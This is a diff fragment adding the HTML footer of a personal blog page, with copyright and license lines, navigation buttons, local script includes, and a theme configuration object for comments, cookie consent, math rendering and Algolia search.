+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
